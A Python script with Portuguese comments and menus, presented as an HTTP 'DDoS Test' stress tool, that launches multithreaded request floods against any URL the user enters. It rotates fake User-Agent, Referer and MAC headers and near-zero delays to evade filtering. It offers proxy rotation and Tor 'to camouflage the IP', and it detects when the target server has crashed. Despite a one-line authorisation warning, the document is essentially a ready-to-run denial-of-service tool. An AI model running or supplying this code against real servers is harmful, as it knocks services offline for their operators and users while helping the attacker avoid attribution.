import threading
import requests
import time
import logging
import sys
from urllib.parse import urlparse
import signal
from datetime import datetime
import random
try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

# Configurações globais
REQUEST_COUNT = 0  # Contador de requisições
SUCCESS_COUNT = 0  # Contador de sucessos
ERROR_COUNT = 0    # Contador de erros
LOCK = threading.Lock()  # Lock pra contadores
STOP_EVENT = threading.Event()  # Evento pra parar threads
SERVER_DOWN = False  # Flag pra indicar se o servidor caiu

# Configura logging
log_file = f"ddos_test_{time.strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format="%(asctime)s [%(threadName)s] %(message)s"
)

def validate_url(url):
    """Valida se a URL é válida e acessível."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code >= 400:
            print(f"\033[91m[ERRO] URL {url} retornou erro {response.status_code}. Verifique o servidor.\033[0m")
            return None
        return url
    except requests.exceptions.RequestException as e:
        print(f"\033[91m[ERRO] URL {url} inválida ou servidor offline: {e}\033[0m")
        return None

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/56.0.2924.87",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 Chrome/83.0.4103.106 Mobile",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 Chrome/78.0.3904.97",
        "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 Chrome/74.0.3729.157 Mobile"
    ]
    return random.choice(user_agents)

def get_random_referer():
    referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.instagram.com/",
        "https://twitter.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/"
    ]
    return random.choice(referers)

def get_random_mac():
    mac = [random.randint(0x00, 0x7f) for _ in range(6)]
    return ':'.join(f'{x:02x}' for x in mac)

def send_requests(url, max_requests_per_thread, method="GET", post_data=None, proxies_list=None, verify_ssl=False):
    """Envia requisições HTTP até o limite, parada manual ou servidor cair."""
    global REQUEST_COUNT, SUCCESS_COUNT, ERROR_COUNT, SERVER_DOWN
    count = 0

    while not STOP_EVENT.is_set() and count < max_requests_per_thread and not SERVER_DOWN:
        try:
            headers = {
                "User-Agent": get_random_user_agent(),
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Referer": get_random_referer(),
                "X-Forwarded-MAC": get_random_mac()
            }
            # Escolhe proxy aleatório se lista fornecida
            proxies = None
            if proxies_list and len(proxies_list) > 0:
                proxies = random.choice(proxies_list)
            start_time = time.time()
            if method == "POST":
                response = requests.post(url, headers=headers, data=post_data, timeout=10, proxies=proxies, verify=verify_ssl)
            else:
                response = requests.get(url, headers=headers, timeout=10, proxies=proxies, verify=verify_ssl)
            elapsed = time.time() - start_time
            with LOCK:
                REQUEST_COUNT += 1
                SUCCESS_COUNT += 1
                msg = f"Status {response.status_code} | Tempo: {elapsed:.2f}s | Método: {method} | UA: {headers['User-Agent']} | MAC: {headers['X-Forwarded-MAC']} | Referer: {headers['Referer']}"
                logging.info(msg)
                print(f"\033[92m[{threading.current_thread().name}] {msg}\033[0m")
            if response.status_code >= 500:
                with LOCK:
                    SERVER_DOWN = True
                    msg = f"Servidor instável (Status {response.status_code}). Parando teste."
                    logging.warning(msg)
                    print(f"\033[91m[{threading.current_thread().name}] {msg}\033[0m")
        except requests.exceptions.RequestException as e:
            with LOCK:
                REQUEST_COUNT += 1
                ERROR_COUNT += 1
                msg = f"Erro: {e} | Método: {method}"
                logging.error(msg)
                print(f"\033[91m[{threading.current_thread().name}] {msg}\033[0m")
                if isinstance(e, (requests.exceptions.ConnectionError, requests.exceptions.Timeout)):
                    SERVER_DOWN = True
                    msg = f"Servidor caiu: {e}. Parando teste."
                    logging.warning(msg)
                    print(f"\033[91m[{threading.current_thread().name}] {msg}\033[0m")
        time.sleep(0.001)  # Delay mínimo para máxima potência
        count += 1

def signal_handler(sig, frame):
    """Lida com Ctrl+C pra parar as threads."""
    print("\n\033[93m[AVISO] Interrompido pelo usuário. Finalizando...\033[0m")
    STOP_EVENT.set()
    time.sleep(1)
    print_report()

def print_report():
    """Exibe relatório final."""
    print(f"\n\033[94m{'='*50}\033[0m")
    print(f"\033[94mRelatório Final - {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\033[0m")
    print(f"Total de requisições: {REQUEST_COUNT}")
    print(f"Sucessos: {SUCCESS_COUNT}")
    print(f"Erros: {ERROR_COUNT}")
    if SERVER_DOWN:
        print("\033[91mTeste parado: Servidor não respondeu (possivelmente caiu).\033[0m")
    print(f"Log salvo em: {log_file}")
    print(f"\033[94m{'='*50}\033[0m")

def display_menu():
    print("\033[96m" + "="*60 + "\033[0m")
    print("\033[96m        DDoS Test - Script de Teste de Estresse HTTP         \033[0m")
    print("\033[93mAVISO: Use APENAS em servidores próprios ou com autorização!\033[0m")
    print("\033[96m" + "="*60 + "\033[0m")
    print("\033[92m1. Configurar e iniciar teste\033[0m")
    print("\033[94m2. Alterar método HTTP (GET/POST)\033[0m")
    print("\033[91m3. Sair\033[0m")
    print("\033[96m" + "="*60 + "\033[0m")
    print("\033[93mSugestão: Para máxima segurança, utilize proxies confiáveis ou Tor.\033[0m")
    if HTTPX_AVAILABLE:
        print("\033[92mBiblioteca httpx disponível para maior performance.\033[0m")
    else:
        print("\033[91mhttpx não instalado. Usando requests. Para instalar: pip install httpx\033[0m")

def validate_proxy(proxy):
    try:
        test_url = "http://httpbin.org/ip"
        resp = requests.get(test_url, proxies=proxy, timeout=5)
        return resp.status_code == 200
    except Exception:
        return False

def main():
    config = {
        "url": "http://127.0.0.1",
        "num_threads": 5,
        "max_requests": 100,
        "method": "GET",
        "post_data": None,
        "proxies_list": [],
        "verify_ssl": False,
        "use_tor": False
    }

    while True:
        display_menu()
        choice = input("\033[92mEscolha uma opção (1-3): \033[0m").strip()

        if choice == "1":
            print("\n\033[93m[CONFIGURAÇÃO] Insira os parâmetros do teste:\033[0m")
            url = input("Digite o IP ou URL do servidor (ex: http://127.0.0.1): ").strip()
            url = validate_url(url)
            if not url:
                continue
            try:
                num_threads = int(input("Digite o número de threads (ex: 5): "))
                max_requests = int(input("Digite o número máximo de requisições por thread (ex: 100): "))
            except ValueError:
                print("\033[91m[ERRO] Insira números válidos.\033[0m")
                continue

            proxies_list = []
            use_proxy = input("Deseja usar proxies para camuflar o IP? (s/n): ").strip().lower()
            if use_proxy == "s":
                print("\033[93mInsira os proxies (um por linha, formato tipo://ip:porta). Digite vazio para terminar:\033[0m")
                while True:
                    proxy_input = input().strip()
                    if not proxy_input:
                        break
                    if proxy_input.startswith("http") or proxy_input.startswith("socks5"):
                        proxy_dict = {"http": proxy_input, "https": proxy_input}
                        print("Testando proxy...", end=" ")
                        if validate_proxy(proxy_dict):
                            print("\033[92mOK\033[0m")
                            proxies_list.append(proxy_dict)
                        else:
                            print("\033[91mFALHOU\033[0m")
                    else:
                        print("\033[91mProxy inválido, use http://ip:porta ou socks5://ip:porta\033[0m")
                config["proxies_list"] = proxies_list
            else:
                config["proxies_list"] = []

            use_tor = input("Deseja usar Tor para anonimato extra? (s/n): ").strip().lower()
            config["use_tor"] = (use_tor == "s")

            verify_ssl = input("Ignorar verificação SSL? (s/n): ").strip().lower()
            config["verify_ssl"] = (verify_ssl == "n")

            config["url"] = url
            config["num_threads"] = num_threads
            config["max_requests"] = max_requests

            # Reseta contadores
            global REQUEST_COUNT, SUCCESS_COUNT, ERROR_COUNT, SERVER_DOWN, log_file
            REQUEST_COUNT = SUCCESS_COUNT = ERROR_COUNT = 0
            SERVER_DOWN = False
            STOP_EVENT.clear()
            log_file = f"ddos_test_{time.strftime('%Y%m%d_%H%M%S')}.log"
            logging.getLogger().handlers = []
            logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")

            # Configura o handler de Ctrl+C
            signal.signal(signal.SIGINT, signal_handler)

            # Inicia teste
            parsed_url = urlparse(url).netloc
            start_time = datetime.now().strftime('%H:%M:%S %d/%m/%Y')
            print(f"\n\033[92m[INFO] Iniciando teste em {parsed_url} às {start_time}\033[0m")
            logging.info(f"Iniciando teste em {parsed_url} com {num_threads} threads e {max_requests} requisições por thread")

            threads = []
            for i in range(num_threads):
                thread = threading.Thread(
                    target=send_requests,
                    args=(url, max_requests, config["method"], config["post_data"], config["proxies_list"], config["verify_ssl"]),
                    name=f"Thread-{i+1}"
                )
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            print_report()

        elif choice == "2":
            method = input("\033[92mDigite o método HTTP (GET ou POST): \033[0m").strip().upper()
            if method not in ["GET", "POST"]:
                print("\033[91m[ERRO] Método inválido. Use GET ou POST.\033[0m")
                continue
            config["method"] = method
            if method == "POST":
                config["post_data"] = input("\033[92mDigite os dados POST (ex: chave=valor, ou deixe vazio): \033[0m").strip() or None
            print(f"\033[92m[INFO] Método alterado para {method}.\033[0m")

        elif choice == "3":
            print("\033[93m[INFO] Saindo do programa. Até mais!\033[0m")
            sys.exit(0)

        else:
            print("\033[91m[ERRO] Opção inválida. Escolha 1, 2 ou 3.\033[0m")

if __name__ == "__main__":
    main()
